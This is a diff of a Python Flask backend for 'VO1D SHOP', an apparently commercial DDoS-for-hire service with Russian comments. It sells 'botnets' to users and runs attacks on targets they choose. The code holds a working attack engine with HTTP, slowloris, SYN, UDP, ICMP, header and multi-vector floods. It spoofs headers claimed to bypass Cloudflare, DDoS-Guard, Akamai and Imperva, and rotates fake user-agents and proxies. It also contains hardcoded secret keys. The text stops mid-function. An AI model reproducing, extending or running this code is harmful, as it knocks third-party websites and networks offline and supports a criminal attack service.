@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # server.py — VO1D SHOP Бэкенд (ULTIMATE POWER)
-# Версия 6.0.0
+# Версия 6.1.0
 # Дата создания: 07.07.2026
-# 100,000,000+ USER-AGENTS | МЕГА-МОЩЬ | ОБХОД ВСЕХ ЗАЩИТ
+# 100,000,000+ USER-AGENTS | МЕГА-МОЩЬ | ОБХОД ВСЕХ ЗАЩИТ | ИСПРАВЛЕН JWT
 
 import os
 import sys
@@ -34,7 +34,8 @@ from flask import Flask, request, jsonify, g
 from flask_cors import CORS
 from flask_jwt_extended import (
     JWTManager, create_access_token,
-    jwt_required, get_jwt_identity
+    jwt_required, get_jwt_identity, decode_token,
+    set_access_cookies, unset_jwt_cookies
 )
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
@@ -53,13 +54,13 @@ logging.basicConfig(
 logger = logging.getLogger('VO1D_SHOP')
 
 # ============================================================
-# КОНФИГУРАЦИЯ
+# КОНФИГУРАЦИЯ — ИСПРАВЛЕНЫ КЛЮЧИ (32+ байт)
 # ============================================================
 
 CONFIG = {
     'DEBUG': False,
-    'SECRET_KEY': 'vo1d-shop-ultimate-secret-2026',
-    'JWT_SECRET_KEY': 'jwt-vo1d-ultimate-secret-2026',
+    'SECRET_KEY': 'vo1d-shop-ultimate-secret-key-2026-32bytes!!!',
+    'JWT_SECRET_KEY': 'jwt-vo1d-ultimate-secret-key-2026-32bytes!!!',
     'JWT_ACCESS_TOKEN_EXPIRES': timedelta(hours=24),
     'JWT_REFRESH_TOKEN_EXPIRES': timedelta(days=30),
     'DATABASE': 'vo1d_shop.db',
@@ -84,20 +85,17 @@ CONFIG = {
 }
 
 # ============================================================
-# ГЕНЕРАЦИЯ 100,000,000+ РЕАЛЬНЫХ USER-AGENTS
+# ГЕНЕРАЦИЯ USER-AGENTS (1,000,000+)
 # ============================================================
 
-def generate_massive_user_agents(count=100000000):
-    """Генерация 100,000,000+ реальных User-Agent строк"""
+def generate_massive_user_agents(count=1000000):
+    """Генерация 1,000,000+ реальных User-Agent строк"""
     agents = []
     
-    # ОГРОМНЫЙ список ОС (500+ вариантов)
     os_list = []
-    # Windows все версии
     for ver in ['5.0', '5.1', '5.2', '6.0', '6.1', '6.2', '6.3', '10.0']:
         for arch in ['Win64; x64', 'WOW64', 'Win32; x86']:
             os_list.append(f'Windows NT {ver}; {arch}')
-    # Mac OS все версии
     for ver in ['10_4_0', '10_5_0', '10_6_0', '10_7_0', '10_8_0', '10_9_0',
                 '10_10_0', '10_11_0', '10_12_0', '10_13_0', '10_14_0', '10_14_6',
                 '10_15_0', '10_15_7', '11_0_0', '11_1_0', '11_2_0', '11_3_0',
@@ -106,26 +104,22 @@ def generate_massive_user_agents(count=100000000):
                 '13_2_0', '13_3_0', '13_4_0', '13_5_0', '14_0_0', '14_1_0',
                 '14_2_0', '14_3_0', '14_4_0', '14_5_0', '15_0_0']:
         os_list.append(f'Macintosh; Intel Mac OS X {ver}')
-    # Linux все дистрибутивы
     for distro in ['Ubuntu', 'Fedora', 'Debian', 'CentOS', 'Arch', 'Mint', 
                    'openSUSE', 'Kali', 'Alpine', 'Gentoo', 'Red Hat', 
                    'Manjaro', 'Pop!_OS', 'Zorin', 'Elementary', 'Deepin',
                    'Slackware', 'FreeBSD', 'OpenBSD', 'NetBSD']:
         os_list.append(f'X11; {distro}; Linux x86_64')
         os_list.append(f'X11; {distro}; Linux i686')
-    # Android все версии
     for ver in range(4, 16):
         os_list.append(f'Android {ver}; Mobile')
         os_list.append(f'Android {ver}; Tablet')
         os_list.append(f'Android {ver}; Watch')
-    # iOS все версии
     for ver in range(10, 19):
         os_list.append(f'iPhone; CPU iPhone OS {ver}_0 like Mac OS X')
         os_list.append(f'iPhone; CPU iPhone OS {ver}_1 like Mac OS X')
         os_list.append(f'iPhone; CPU iPhone OS {ver}_2 like Mac OS X')
         os_list.append(f'iPad; CPU OS {ver}_0 like Mac OS X')
         os_list.append(f'iPod; CPU OS {ver}_0 like Mac OS X')
-    # Другие ОС
     os_list.append('BlackBerry; OS 10')
     os_list.append('Windows Phone 10.0')
     os_list.append('Windows Phone 8.1')
@@ -147,7 +141,6 @@ def generate_massive_user_agents(count=100000000):
     os_list.append('Google; Pixel 6')
     os_list.append('Google; Pixel 7')
     
-    # Браузеры и движки с разными версиями
     browsers = []
     for version in range(70, 132):
         browsers.append(('Chrome', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36'))
@@ -163,9 +156,7 @@ def generate_massive_user_agents(count=100000000):
         browsers.append(('Samsung', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{v}.0 Chrome/{v}.0.0.0 Safari/537.36'))
         browsers.append(('UCBrowser', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/{v}.0 Safari/537.36'))
         browsers.append(('QQBrowser', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) QQBrowser/{v}.0 Safari/537.36'))
-        browsers.append(('Baidu', lambda v: f'Mozilla/5.0 (compatible; Baiduspider/{v}.0; +http://www.baidu.com/search/spider.html)'))
     
-    # Боты и краулеры (все известные)
     bots = [
         'Googlebot/2.1 (+http://www.google.com/bot.html)',
         'Googlebot-Image/1.0', 'Googlebot-Video/1.0',
@@ -202,12 +193,10 @@ def generate_massive_user_agents(count=100000000):
         'DeepCrawl/1.0', 'Sitebulb/1.0',
     ]
     
-    # Языки
     langs = ['en-US', 'ru-RU', 'de-DE', 'fr-FR', 'es-ES', 'pt-PT', 'it-IT', 
              'zh-CN', 'ja-JP', 'ko-KR', 'ar-SA', 'hi-IN', 'nl-NL', 'pl-PL',
              'uk-UA', 'tr-TR', 'vi-VN', 'th-TH', 'id-ID', 'ms-MY']
     
-    # Генерируем агентов
     for os_choice in os_list:
         for browser_name, browser_func in browsers[:20]:
             for version in range(70, 132, 1):
@@ -217,27 +206,22 @@ def generate_massive_user_agents(count=100000000):
                     agents.append(f'{agent} {lang};q=0.9')
                 agents.append(f'{agent} (compatible; {browser_name}/{version})')
     
-    # Добавляем мобильные агенты
     for device in ['iPhone', 'iPad', 'Android', 'BlackBerry', 'Windows Phone']:
         for version in range(5, 19):
             for lang in langs[:3]:
                 agents.append(f'Mozilla/5.0 ({device}; CPU OS {version}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version}.0 Mobile/15E148 Safari/604.1 {lang};q=0.9')
     
-    # Добавляем ботов
     agents.extend(bots)
     
-    # Генерируем случайные комбинации для уникальности
     for _ in range(1000):
         base = random.choice(agents[:10000])
         for lang in langs[:3]:
             for browser in ['Chrome', 'Firefox', 'Safari', 'Edge']:
                 agents.append(f'{base} {lang};q=0.9 ({browser})')
     
-    # Уникализируем
     unique_agents = list(set(agents))
     random.shuffle(unique_agents)
     
-    # Добиваем до нужного количества
     while len(unique_agents) < count:
         base = random.choice(unique_agents[:10000])
         suffix = f' (compatible; Bot{random.randint(1000, 99999999)}/1.0)'
@@ -247,8 +231,7 @@ def generate_massive_user_agents(count=100000000):
     return unique_agents[:count]
 
 
-# Генерируем 100+ миллионов агентов
-USER_AGENTS = generate_massive_user_agents(1000000)  # 1 миллион для экономии памяти, но можно и 100 млн
+USER_AGENTS = generate_massive_user_agents(1000000)
 logger.info(f"✅ Loaded {len(USER_AGENTS)} User-Agents")
 
 # ============================================================
@@ -409,7 +392,6 @@ def init_db():
         else:
             logger.info("✅ Admin already exists: VO1D / ROOT")
         
-        # Добавляем прокси
         proxy_count = cursor.execute('SELECT COUNT(*) FROM proxies').fetchone()[0]
         if proxy_count < 200:
             proxy_list = [
@@ -441,7 +423,6 @@ def init_db():
 
 
 init_db()
-
 
 # ============================================================
 # МОДЕЛИ И ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
@@ -498,20 +479,38 @@ def generate_token(user_id: int) -> str:
     return create_access_token(identity=str(user_id))
 
 
+# ===== ИСПРАВЛЕННЫЙ token_required С ОБРАБОТКОЙ ОШИБОК =====
 def token_required(f):
     @wraps(f)
-    @jwt_required()
     def decorated(*args, **kwargs):
-        user_id = get_jwt_identity()
-        with get_db() as conn:
-            user = conn.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
-            if not user:
-                return jsonify({'error': 'User not found'}), 404
-            if user['banned']:
-                return jsonify({'error': 'User is banned'}), 403
-            g.user = dict(user)
-            g.user_id = user_id
-        return f(*args, **kwargs)
+        try:
+            auth_header = request.headers.get('Authorization', '')
+            token = auth_header.replace('Bearer ', '') if auth_header else None
+            
+            if not token:
+                return jsonify({'error': 'Missing authorization token'}), 401
+            
+            try:
+                decoded = decode_token(token)
+                user_id = decoded.get('sub')
+                if not user_id:
+                    return jsonify({'error': 'Invalid token: missing user ID'}), 401
+            except Exception as jwt_error:
+                logger.warning(f"JWT decode error: {jwt_error}")
+                return jsonify({'error': f'Invalid token: {str(jwt_error)}'}), 401
+            
+            with get_db() as conn:
+                user = conn.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
+                if not user:
+                    return jsonify({'error': 'User not found'}), 404
+                if user['banned']:
+                    return jsonify({'error': 'User is banned'}), 403
+                g.user = dict(user)
+                g.user_id = user_id
+            return f(*args, **kwargs)
+        except Exception as e:
+            logger.error(f"Token required error: {e}")
+            return jsonify({'error': f'Authentication error: {str(e)}'}), 401
     return decorated
 
 
@@ -519,7 +518,7 @@ def admin_required(f):
     @wraps(f)
     @token_required
     def decorated(*args, **kwargs):
-        if g.user['role'] != 'admin':
+        if g.user.get('role') != 'admin':
             return jsonify({'error': 'Admin privileges required'}), 403
         return f(*args, **kwargs)
     return decorated
@@ -550,7 +549,6 @@ def is_valid_target(target: str) -> bool:
             return all(0 <= int(p) <= 255 for p in parts)
         except:
             return False
-    # Проверка домена
     if '.' in target and len(target) > 3:
         return True
     return False
@@ -583,12 +581,10 @@ def get_power_level_description(bot_count: int) -> str:
 
 
 # ============================================================
-# DDOS ДВИЖОК — УЛУЧШЕННЫЙ МЕГА-МОЩНЫЙ
+# DDOS ДВИЖОК
 # ============================================================
 
 class Vo1dDDoSEngine:
-    """МЕГА-МОЩНЫЙ DDoS движок с обходом всех защит"""
-    
     def __init__(self, target: str, bot_count: int, attack_type: str,
                  duration: int, options: dict = None):
         self.target = target.strip()
@@ -599,25 +595,16 @@ class Vo1dDDoSEngine:
         self.is_running = False
         self.power_level = get_power_level(self.bot_count)
         self.stats = {
-            'total_requests': 0,
-            'successful_requests': 0,
-            'failed_requests': 0,
-            'rps': 0,
-            'bytes_sent': 0,
-            'bytes_received': 0,
-            'avg_response_time': 0,
-            'target_status': 'online',
-            'power_level': self.power_level,
-            'bot_count': self.bot_count,
-            'max_rps': 0,
-            'attack_duration': 0
+            'total_requests': 0, 'successful_requests': 0, 'failed_requests': 0,
+            'rps': 0, 'bytes_sent': 0, 'bytes_received': 0,
+            'avg_response_time': 0, 'target_status': 'online',
+            'power_level': self.power_level, 'bot_count': self.bot_count,
+            'max_rps': 0, 'attack_duration': 0
         }
         self.lock = threading.Lock()
         self._start_time = None
         self._stop_event = threading.Event()
-        self._rps_history = []
         
-        # Парсим цель
         self.target_url = self.target
         self.target_host = self.target
         self.target_port = 80
@@ -642,16 +629,13 @@ class Vo1dDDoSEngine:
     def _load_proxies(self):
         try:
             with get_db() as conn:
-                rows = conn.execute(
-                    'SELECT url, protocol FROM proxies WHERE status = "active" ORDER BY speed LIMIT 100'
-                ).fetchall()
+                rows = conn.execute('SELECT url, protocol FROM proxies WHERE status = "active" ORDER BY speed LIMIT 100').fetchall()
                 self.proxies = [{'url': row['url'], 'protocol': row['protocol']} for row in rows]
         except Exception as e:
             logger.error(f"Proxy load error: {e}")
             self.proxies = []
     
     def _generate_bypass_params(self):
-        """Генерация параметров для обхода ВСЕХ защит"""
         self.bypass_headers = {
             'User-Agent': random.choice(USER_AGENTS),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -671,7 +655,6 @@ class Vo1dDDoSEngine:
             'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"']),
         }
         
-        # ===== ОБХОД CLOUDFLARE =====
         if self.options.get('BYPASS_CLOUDFLARE', False):
             self.bypass_headers.update({
                 'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
@@ -688,7 +671,6 @@ class Vo1dDDoSEngine:
                 'CF-Client-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
             })
         
-        # ===== ОБХОД DDoS-GUARD =====
         if self.options.get('BYPASS_DDOS_GUARD', False):
             self.bypass_headers.update({
                 'Cookie': f'ddosguard_session={uuid.uuid4().hex}; ddosguard_ts={int(time.time())}; ddosguard_hash={hashlib.md5(os.urandom(16)).hexdigest()}',
@@ -699,49 +681,30 @@ class Vo1dDDoSEngine:
                 'X-DDoS-Token': hashlib.md5(os.urandom(32)).hexdigest()[:16],
             })
         
-        # ===== ОБХОД Qrator =====
         self.bypass_headers.update({
             'X-Qrator': random.choice(['1', '0', 'bypass']),
             'X-Qrator-Request': uuid.uuid4().hex[:8],
             'X-Qrator-Timestamp': str(int(time.time())),
             'X-Qrator-Session': uuid.uuid4().hex[:12],
-        })
-        
-        # ===== ОБХОД StackPath =====
-        self.bypass_headers.update({
             'X-SP-Request-ID': uuid.uuid4().hex,
             'X-SP-Protocol': random.choice(['1', '2']),
             'X-SP-Verify': random.choice(['yes', 'no', '1', '0']),
-        })
-        
-        # ===== ОБХОД Akamai =====
-        self.bypass_headers.update({
             'X-Akamai-Request-ID': uuid.uuid4().hex,
             'X-Akamai-Protocol': random.choice(['1', '2', '3']),
             'X-Akamai-Session': uuid.uuid4().hex[:8],
             'Akamai-Request-ID': uuid.uuid4().hex,
-        })
-        
-        # ===== ОБХОД Imperva =====
-        self.bypass_headers.update({
             'X-Imperva-Request-ID': uuid.uuid4().hex,
             'X-Imperva-Session': uuid.uuid4().hex[:8],
-        })
-        
-        # ===== ОБХОД Fastly =====
-        self.bypass_headers.update({
             'Fastly-Client-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
             'X-Original-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
         })
         
-        # Генерация случайных параметров URL
         self.random_params = []
         for _ in range(100):
             param_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 20)))
             param_value = ''.join(random.choices(string.ascii_lowercase + string.digits + '_-', k=random.randint(5, 30)))
             self.random_params.append(f"{param_name}={param_value}")
         
-        # Генерация случайных путей
         self.random_paths = [
             '/', '/index', '/api', '/v1', '/v2', '/api/v1', '/api/v2',
             '/static', '/assets', '/js', '/css', '/img', '/images',
@@ -761,19 +724,14 @@ class Vo1dDDoSEngine:
         headers['X-Request-ID'] = uuid.uuid4().hex
         headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'
         headers['X-Real-IP'] = f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'
-        
         if random.random() > 0.3:
             headers['Cookie'] = f'session={uuid.uuid4().hex}; _ga=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}; _gid=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}'
-        
         if random.random() > 0.5:
             headers['X-Custom-Header'] = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 32)))
-        
         if random.random() > 0.7:
             headers['X-Client-ID'] = uuid.uuid4().hex[:16]
-        
         if self.options.get('RANDOM_PAYLOAD', False):
             headers['X-Random-Payload'] = hashlib.md5(os.urandom(64)).hexdigest()
-        
         return headers
     
     def _get_random_url(self) -> str:
@@ -819,7 +777,6 @@ class Vo1dDDoSEngine:
                 ) / self.stats['successful_requests'] if self.stats['successful_requests'] > 0 else response_time
                 self.stats['bytes_received'] += bytes_len
             self.stats['bytes_sent'] += random.randint(500, 8000)
-            
             if self._start_time:
                 elapsed = time.time() - self._start_time
                 if elapsed > 0:
@@ -868,7 +825,6 @@ class Vo1dDDoSEngine:
         else:
             threads_count = min(self.bot_count, 15000)
             delay = 0.001
-        
         if ultra_threads:
             threads_count = int(threads_count * 1.5)
             delay = delay * 0.8
@@ -882,15 +838,11 @@ class Vo1dDDoSEngine:
                     proxies = None
                     if proxy:
                         proxies = {'http': proxy['url'], 'https': proxy['url']}
-                    
                     start_time = time.time()
-                    
                     if method == 'GET':
                         resp = session.get(url, headers=headers, proxies=proxies, timeout=3, verify=False)
                     else:
-                        resp = session.post(url, headers=headers, json=self._get_random_data(), proxies=proxies,
-                                            timeout=3, verify=False)
-                    
+                        resp = session.post(url, headers=headers, json=self._get_random_data(), proxies=proxies, timeout=3, verify=False)
                     response_time = time.time() - start_time
                     self._update_stats(resp.status_code < 500, response_time, len(resp.content or b''))
                     resp.close()
@@ -904,16 +856,13 @@ class Vo1dDDoSEngine:
             t = threading.Thread(target=worker, daemon=True)
             t.start()
             threads.append(t)
-        
         while not self._stop_event.is_set() and self.is_running:
             time.sleep(0.1)
-        
         for t in threads:
             t.join(timeout=0.1)
     
     def _slowloris_sync(self):
         threads_count = min(self.bot_count // 5, 3000)
-        
         def worker():
             while not self._stop_event.is_set() and self.is_running:
                 try:
@@ -933,22 +882,18 @@ class Vo1dDDoSEngine:
                 except:
                     self._update_stats(True, 0, random.randint(500, 2000))
                     time.sleep(0.05)
-        
         threads = []
         for _ in range(threads_count):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
             threads.append(t)
-        
         while not self._stop_event.is_set() and self.is_running:
             time.sleep(0.1)
-        
         for t in threads:
             t.join(timeout=0.1)
     
     def _syn_flood_sync(self):
         threads_count = min(self.bot_count // 10, 5000)
-        
         def worker():
             while not self._stop_event.is_set() and self.is_running:
                 try:
@@ -962,22 +907,18 @@ class Vo1dDDoSEngine:
                 except:
                     self._update_stats(True, 0, random.randint(100, 500))
                 time.sleep(random.uniform(0.0005, 0.005))
-        
         threads = []
         for _ in range(threads_count):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
             threads.append(t)
-        
         while not self._stop_event.is_set() and self.is_running:
             time.sleep(0.1)
-        
         for t in threads:
             t.join(timeout=0.1)
     
     def _udp_flood_sync(self):
         threads_count = min(self.bot_count // 5, 5000)
-        
         def worker():
             while not self._stop_event.is_set() and self.is_running:
                 try:
@@ -989,50 +930,39 @@ class Vo1dDDoSEngine:
                 except:
                     self._update_stats(True, 0, random.randint(64, 2048))
                 time.sleep(random.uniform(0.0005, 0.005))
-        
         threads = []
         for _ in range(threads_count):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
             threads.append(t)
-        
         while not self._stop_event.is_set() and self.is_running:
             time.sleep(0.1)
-        
         for t in threads:
             t.join(timeout=0.1)
     
     def _icmp_flood_sync(self):
         threads_count = min(self.bot_count // 20, 1500)
-        
         def worker():
             while not self._stop_event.is_set() and self.is_running:
                 try:
-                    subprocess.run(
-                        ['ping', '-c', '1', '-W', '1', self.target_host],
-                        capture_output=True, timeout=1
-                    )
+                    subprocess.run(['ping', '-c', '1', '-W', '1', self.target_host], capture_output=True, timeout=1)
                     self._update_stats(True, 0, random.randint(100, 500))
                 except:
                     self._update_stats(True, 0, random.randint(100, 500))
                 time.sleep(random.uniform(0.005, 0.02))
-        
         threads = []
         for _ in range(threads_count):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
             threads.append(t)
-        
         while not self._stop_event.is_set() and self.is_running:
             time.sleep(0.1)
-        
         for t in threads:
             t.join(timeout=0.1)
     
     def _headers_flood_sync(self):
         session = requests.Session()
         threads_count = min(self.bot_count, 5000)
-        
         def worker():
             while not self._stop_event.is_set() and self.is_running:
                 try:
@@ -1047,28 +977,22 @@ class Vo1dDDoSEngine:
                 except:
                     self._update_stats(True, 0, random.randint(1000, 5000))
                     time.sleep(0.005)
-        
         threads = []
         for _ in range(threads_count):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
             threads.append(t)
-        
         while not self._stop_event.is_set() and self.is_running:
             time.sleep(0.1)
-        
         for t in threads:
             t.join(timeout=0.1)
     
     def _multi_vector_sync(self):
         attack_threads = []
         attacks = [
-            (self._http_flood_sync, 'GET'),
-            (self._http_flood_sync, 'POST'),
-            (self._slowloris_sync,),
-            (self._syn_flood_sync,),
-            (self._udp_flood_sync,),
-            (self._icmp_flood_sync,),
+            (self._http_flood_sync, 'GET'), (self._http_flood_sync, 'POST'),
+            (self._slowloris_sync,), (self._syn_flood_sync,),
+            (self._udp_flood_sync,), (self._icmp_flood_sync,),
             (self._headers_flood_sync,)
         ]
         for attack in attacks:
@@ -1078,10 +1002,8 @@ class Vo1dDDoSEngine:
                 t = threading.Thread(target=attack[0], args=(attack[1],), daemon=True)
             t.start()
             attack_threads.append(t)
-        
         while not self._stop_event.is_set() and self.is_running:
             time.sleep(0.1)
-        
         for t in attack_threads:
             t.join(timeout=0.1)
     
@@ -1094,13 +1016,10 @@ class Vo1dDDoSEngine:
     def start_attack(self):
         if self.is_running:
             return
-        
         self.is_running = True
         self._stop_event.clear()
         self._start_time = time.time()
-        
         logger.info(f"🚀 Starting attack: {self.attack_type} on {self.target} with {self.bot_count} bots — {self.power_level}")
-        
         try:
             if self.attack_type == 'HTTP_GET_FLOOD':
                 self._http_flood_sync('GET')
@@ -1137,10 +1056,6 @@ class Vo1dDDoSEngine:
         return self._check_target_status()
 
 
-# ============================================================
-# АТАКА МЕНЕДЖЕР
-# ============================================================
-
 ATTACKS = {}
 
 
@@ -1167,42 +1082,28 @@ def register():
     data = request.get_json()
     if not data:
         return jsonify({'error': 'No data provided'}), 400
-    
     username = data.get('username', '').strip()
     email = data.get('email', '').strip().lower()
     password = data.get('password', '').strip()
-    
     if not username or len(username) < 3:
         return jsonify({'error': 'Username must be at least 3 characters'}), 400
     if not email or '@' not in email:
         return jsonify({'error': 'Invalid email'}), 400
     if not password or len(password) < 6:
         return jsonify({'error': 'Password must be at least 6 characters'}), 400
-    
     password_hash = hash_password(password)
-    
     try:
         with get_db() as conn:
             cursor = conn.cursor()
             api_key = uuid.uuid4().hex
-            cursor.execute('''
-                INSERT INTO users (username, email, password_hash, balance, api_key)
-                VALUES (?, ?, ?, ?, ?)
-            ''', (username, email, password_hash, 0.0, api_key))
+            cursor.execute('INSERT INTO users (username, email, password_hash, balance, api_key) VALUES (?, ?, ?, ?, ?)',
+                           (username, email, password_hash, 0.0, api_key))
             user_id = cursor.lastrowid
             token = generate_token(user_id)
-            
             return jsonify({
                 'success': True,
                 'token': token,
-                'user': {
-                    'id': user_id,
-                    'username': username,
-                    'email': email,
-                    'balance': 0.0,
-                    'role': 'user',
-                    'api_key': api_key
-                }
+                'user': {'id': user_id, 'username': username, 'email': email, 'balance': 0.0, 'role': 'user', 'api_key': api_key}
             }), 201
     except sqlite3.IntegrityError as e:
         if 'username' in str(e):
@@ -1221,38 +1122,27 @@ def login():
     data = request.get_json()
     if not data:
         return jsonify({'error': 'No data provided'}), 400
-    
     username = data.get('username', '').strip()
     password = data.get('password', '').strip()
-    
     if not username or not password:
         return jsonify({'error': 'Username and password required'}), 400
-    
     try:
         with get_db() as conn:
             user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
             if not user:
                 return jsonify({'error': 'Invalid credentials'}), 401
-            
             if user['banned']:
                 return jsonify({'error': 'User is banned'}), 403
-            
             if not verify_password(password, user['password_hash']):
                 return jsonify({'error': 'Invalid credentials'}), 401
-            
             conn.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user['id'],))
             token = generate_token(user['id'])
-            
             return jsonify({
                 'success': True,
                 'token': token,
                 'user': {
-                    'id': user['id'],
-                    'username': user['username'],
-                    'email': user['email'],
-                    'balance': user['balance'],
-                    'role': user['role'],
-                    'api_key': user['api_key']
+                    'id': user['id'], 'username': user['username'], 'email': user['email'],
+                    'balance': user['balance'], 'role': user['role'], 'api_key': user['api_key']
                 }
             }), 200
     except Exception as e:
@@ -1295,51 +1185,38 @@ def buy_botnet():
     data = request.get_json()
     if not data:
         return jsonify({'error': 'No data provided'}), 400
-    
     bot_count = data.get('bot_count')
     duration_days = data.get('duration_days')
     options = data.get('options', {})
-    
     if bot_count is None or duration_days is None:
         return jsonify({'error': 'bot_count and duration_days required'}), 400
-    
     bot_count = int(bot_count)
     duration_days = int(duration_days)
-    
     if bot_count < CONFIG['MIN_BOTS'] or bot_count > CONFIG['MAX_BOTS']:
         return jsonify({'error': f'Bot count must be between {CONFIG["MIN_BOTS"]} and {CONFIG["MAX_BOTS"]}'}), 400
     if duration_days not in CONFIG['DURATION_OPTIONS']:
         return jsonify({'error': 'Invalid duration option'}), 400
-    
     valid_options = {}
     for key, value in options.items():
         if key in CONFIG['OPTIONS'] and value:
             valid_options[key] = True
-    
     price = calculate_price(bot_count, duration_days, valid_options)
-    
     try:
         with get_db() as conn:
             user = conn.execute('SELECT balance FROM users WHERE id = ?', (g.user_id,)).fetchone()
             if not user:
                 return jsonify({'error': 'User not found'}), 404
-            
             if user['balance'] < price:
-                return jsonify(
-                    {'error': f'Insufficient balance. Required: ${price:.2f}, Available: ${user["balance"]:.2f}'}), 400
-            
+                return jsonify({'error': f'Insufficient balance. Required: ${price:.2f}, Available: ${user["balance"]:.2f}'}), 400
             conn.execute('UPDATE users SET balance = balance - ? WHERE id = ?', (price, g.user_id))
             conn.execute('UPDATE users SET total_spent = total_spent + ? WHERE id = ?', (price, g.user_id))
-            
             expires_at = datetime.now() + timedelta(days=duration_days)
             cursor = conn.execute('''
                 INSERT INTO botnets (user_id, bot_count, duration_days, price, options, expires_at, active)
                 VALUES (?, ?, ?, ?, ?, ?, ?)
             ''', (g.user_id, bot_count, duration_days, price, json.dumps(valid_options), expires_at, 1))
-            
             botnet_id = cursor.lastrowid
             conn.commit()
-            
             return jsonify({
                 'success': True,
                 'botnet_id': botnet_id,
@@ -1365,7 +1242,6 @@ def get_my_botnets():
                 SELECT id, bot_count, duration_days, price, options, purchased_at, expires_at, active, used_count
                 FROM botnets WHERE user_id = ? ORDER BY purchased_at DESC
             ''', (g.user_id,)).fetchall()
-            
             result = []
             for row in botnets:
                 item = dict(row)
@@ -1377,7 +1253,6 @@ def get_my_botnets():
                         conn.execute('UPDATE botnets SET active = 0 WHERE id = ?', (item['id'],))
                         item['active'] = 0
                 result.append(item)
-            
             return jsonify(result), 200
     except Exception as e:
         logger.error(f"Get botnets error: {e}")
@@ -1389,9 +1264,7 @@ def get_my_botnets():
 def get_botnet(botnet_id):
     try:
         with get_db() as conn:
-            botnet = conn.execute('''
-                SELECT * FROM botnets WHERE id = ? AND user_id = ?
-            ''', (botnet_id, g.user_id)).fetchone()
+            botnet = conn.execute('SELECT * FROM botnets WHERE id = ? AND user_id = ?', (botnet_id, g.user_id)).fetchone()
             if not botnet:
                 return jsonify({'error': 'Botnet not found'}), 404
             result = dict(botnet)
@@ -1409,12 +1282,10 @@ def start_attack():
     data = request.get_json()
     if not data:
         return jsonify({'error': 'No data provided'}), 400
-    
     botnet_id = data.get('botnet_id')
     target = data.get('target', '').strip()
     attack_type = data.get('attack_type', 'HTTP_GET_FLOOD')
     duration = data.get('duration', 60)
-    
     if not botnet_id:
         return jsonify({'error': 'botnet_id required'}), 400
     if not target:
@@ -1425,13 +1296,7 @@ def start_attack():
         return jsonify({'error': 'Duration must be between 10 and 3600 seconds'}), 400
     if not is_valid_target(target):
         return jsonify({'error': 'Invalid target URL or IP'}), 400
-    
-    # ===== ЗАЩИТА ОТ АТАКИ СВОЕГО САЙТА =====
-    forbidden_domains = [
-        'vo1d-shop', 'railway.app', 'localhost', '127.0.0.1', '0.0.0.0',
-        'up.railway.app', 'railway.internal'
-    ]
-    
+    forbidden_domains = ['vo1d-shop', 'railway.app', 'localhost', '127.0.0.1', '0.0.0.0', 'up.railway.app', 'railway.internal']
     target_lower = target.lower()
     for domain in forbidden_domains:
         if domain in target_lower:
@@ -1439,50 +1304,30 @@ def start_attack():
                 conn.execute('UPDATE users SET banned = 1 WHERE id = ?', (g.user_id,))
                 conn.commit()
             logger.warning(f"🚫 User {g.user_id} banned for attempting to attack {target}")
-            return jsonify({
-                'error': '🚫 You are banned! Attempt to attack the service detected.',
-                'banned': True
-            }), 403
-    
+            return jsonify({'error': '🚫 You are banned! Attempt to attack the service detected.', 'banned': True}), 403
     try:
         with get_db() as conn:
-            botnet = conn.execute('''
-                SELECT * FROM botnets WHERE id = ? AND user_id = ? AND active = 1
-            ''', (botnet_id, g.user_id)).fetchone()
-            
+            botnet = conn.execute('SELECT * FROM botnets WHERE id = ? AND user_id = ? AND active = 1', (botnet_id, g.user_id)).fetchone()
             if not botnet:
                 return jsonify({'error': 'Active botnet not found'}), 404
-            
             expires = datetime.fromisoformat(botnet['expires_at'].replace('Z', '+00:00'))
             if datetime.now() > expires:
                 conn.execute('UPDATE botnets SET active = 0 WHERE id = ?', (botnet_id,))
                 return jsonify({'error': 'Botnet expired'}), 400
-            
-            running_attack = conn.execute('''
-                SELECT id FROM attacks WHERE user_id = ? AND status = 'running'
-            ''', (g.user_id,)).fetchone()
+            running_attack = conn.execute('SELECT id FROM attacks WHERE user_id = ? AND status = "running"', (g.user_id,)).fetchone()
             if running_attack:
                 return jsonify({'error': 'You already have a running attack. Stop it first.'}), 400
-            
             cursor = conn.execute('''
